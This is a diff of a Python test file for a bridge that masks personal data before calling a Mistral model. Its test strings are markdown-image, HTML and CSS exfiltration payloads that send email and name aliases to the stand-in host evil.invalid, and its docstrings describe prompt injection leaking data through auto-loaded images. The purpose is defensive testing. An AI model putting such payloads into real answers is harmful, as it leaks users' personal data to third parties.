@@ -281,62 +281,73 @@ def test_a_stop_sequence_holding_personal_data_stops_the_request():
 
 def test_aliases_inside_links_stay_masked():
     """An answer can put an alias in a URL (a hostile provider, or a pasted document with
-    injected instructions): restored there, the value would leave the machine as soon as the
-    client loads the image. From a link mark to the end of its paragraph aliases stay masked;
-    other paragraphs and the text before the mark (link text included) get the values."""
+    injected instructions): restored there, the value would leave the machine. From a link or
+    URL mark to the end of its paragraph aliases stay masked; other paragraphs and the text
+    before the mark (link text included) get the values."""
     links = [
-        "![b](https://evil.invalid/q?e=[EMAIL_1])",
-        "![c](https://evil.invalid/a(b)?q=[EMAIL_1])",
-        "![f]( //evil.invalid/[EMAIL_1].png)",
-        "![g](\n//evil.invalid/[EMAIL_1].png)",
-        "[r]:\n  //evil.invalid/?q=[EMAIL_1]",
-        "> [r]: //evil.invalid/?q=[EMAIL_1]",
-        "- [r]: //evil.invalid/?q=[EMAIL_1]",
+        "[b](https://evil.invalid/q?e=[EMAIL_1])",
+        "[c](https://evil.invalid/a(b)?q=[EMAIL_1])",
+        "[f]( //evil.invalid/[EMAIL_1].png)",
+        "[g](\n//evil.invalid/[EMAIL_1].png)",
         "https://evil.invalid/?n=[PERSON_1]",
         "www.evil.invalid/[EMAIL_1]",
         "_www.evil.invalid/?q=[EMAIL_1]_",
     ]
     for link in links:
         fake = FakeMistral(reply=f"Voir {link} et [PERSON_1].\n\nContact : [PERSON_1], [EMAIL_1].")
-        response = ask(bridge(fake), {"role": "user", "content": f"Écrire à {NAME} ({EMAIL})."})
-        content = response.json()["choices"][0]["message"]["content"]
-        assert content == (f"Voir {link} et [PERSON_1].\n\nContact : {NAME}, {EMAIL}."), link
-    fake = FakeMistral(reply="Voir [[PERSON_1]](https://site.invalid) ; [EMAIL_1]: écrire.")
-    response = ask(bridge(fake), {"role": "user", "content": f"{NAME} ({EMAIL})"})
-    content = response.json()["choices"][0]["message"]["content"]
-    assert content == f"Voir [{NAME}](https://site.invalid) ; [EMAIL_1]: écrire."
+        content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
+        assert content == f"Voir {link} et [PERSON_1].\n\nContact : {NAME}, {EMAIL}.", link
+    fake = FakeMistral(reply="Voir [[PERSON_1]](https://site.invalid) ; [EMAIL_1] écrit.")
+    content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
+    assert content == f"Voir [{NAME}](https://site.invalid) ; [EMAIL_1] écrit."
 
 
-def test_after_raw_html_nothing_more_is_restored():
-    """An HTML block can run across blank lines (`<pre>`, `<style>`), a `>` inside an attribute
-    defeats counting brackets, `<[PERSON_1]` becomes a tag once the name is put back, and a client
-    decoding JSON turns `\\u003c` into `<`: from the first `<` (unless a space, `=` or digit
-    follows) or backslash escape on, aliases stay masked."""
+def test_after_an_image_a_tag_or_an_escape_nothing_more_is_restored():
+    """An image is fetched as soon as it is shown, and can use a definition anywhere in the
+    answer (`![a][[PERSON_1]]` tells a third party which candidate name is the real one); an
+    HTML block can run across blank lines and `<[PERSON_1]` becomes a tag once the name is
+    back; a client decoding JSON, JSON5 or YAML turns escapes into marks. From the first image,
+    `<` (unless a space, `=` or digit follows) or backslash on, aliases stay masked."""
     answers = [
+        "![b](https://evil.invalid/q?e=[EMAIL_1])\n\n[PERSON_1]",
+        "![f]( //evil.invalid/[EMAIL_1].png)\n\n[PERSON_1]",
+        "![a][[PERSON_1]]\n\n[Jean Dupont]: https://evil.invalid/HIT.png",
+        "![[PERSON_1]]\n\n[jean dupont]: https://evil.invalid/HIT.png",
+        "![[PERSON_1]][]\n\n[jean dupont]: https://evil.invalid/HIT.png",
         "<img\n\nsrc=//evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
         '<pre><img alt=">" src="https://evil.invalid/c?d=\n\n[EMAIL_1]"></pre>\n\n[PERSON_1]',
         "<style>\n\nbody{background:url(https:evil.invalid/c?d=[EMAIL_1])}\n</style>",
-        '<img src="https://evil.invalid/x?[EMAIL_1]">\n\n[PERSON_1]',
         "<object data=//evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
-        '<div style="background:url(//evil.invalid/[EMAIL_1])">\n\n[PERSON_1]',
-        "![h][r]\n\n[r]: <https://evil.invalid/a b?q=[PERSON_1]>\n\n[EMAIL_1]",
-        '<https://site.invalid> <pre><img alt=">" src="https://evil.invalid/?d=\n\n[EMAIL_1]">',
-        "![a](<https://evil.invalid/p?d=[PERSON_1]>)\n\n[EMAIL_1]",
-        "![e](<https://evil.invalid/a\\>b?q=[PERSON_1]>)\n\n[EMAIL_1]",
         "<https://evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
         "<[PERSON_1] style=\"background:url('/\\\\evil.invalid/x?e=[EMAIL_1]')\">",
         '<ab:c/title="x>\n\n" style="background:url(\'/\\\\evil.invalid/x?[EMAIL_1]\')">',
         '{"s": "<img src=\\"https:\\/\\/evil.invalid\\/p.png?u=[EMAIL_1]\\">"}\n\n[PERSON_1]',
-        '{"s": "![x](https:\\/\\/evil.invalid\\/p.png?u=[EMAIL_1])"}',
-        "![d](https://evil.invalid/a\\)?q=[EMAIL_1])\n\n[PERSON_1]",
+        '{"note": "[x]\\\n(https:evil.invalid/p.png?u=[EMAIL_1])"}\n\n[PERSON_1]',
+        "[d](https://evil.invalid/a\\)?q=[EMAIL_1])\n\n[PERSON_1]",
     ]
     for answer in answers:
-        response = ask(bridge(FakeMistral(reply=f"Pour [PERSON_1] : {answer}")), USER_MESSAGE)
-        content = response.json()["choices"][0]["message"]["content"]
+        fake = FakeMistral(reply=f"Pour [PERSON_1] : {answer}")
+        content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
         assert content == f"Pour {NAME} : {answer}", answer
     fake = FakeMistral(reply="Si a < b et c <= 3 <4, voir [PERSON_1].")
     content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
     assert content == f"Si a < b et c <= 3 <4, voir {NAME}."
+
+
+def test_from_a_reference_definition_nothing_more_is_restored():
+    """A definition serves images anywhere in the answer and its label may hold an alias: from
+    the start of its paragraph on, aliases stay masked; earlier paragraphs get the values."""
+    definitions = [
+        "[[PERSON_1]]: https://evil.invalid/HIT.png\n\n![a][jean dupont] [EMAIL_1]",
+        "[r]:\n  //evil.invalid/?q=[EMAIL_1]",
+        "> [r]: //evil.invalid/?q=[EMAIL_1]",
+        "- [r]: //evil.invalid/?q=[EMAIL_1]",
+        "[EMAIL_1]: écrire.",
+    ]
+    for definition in definitions:
+        fake = FakeMistral(reply=f"Bonjour [PERSON_1].\n\n{definition}")
+        content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
+        assert content == f"Bonjour {NAME}.\n\n{definition}", definition
 
 
 def test_aliases_inside_links_stay_masked_in_json_answers():
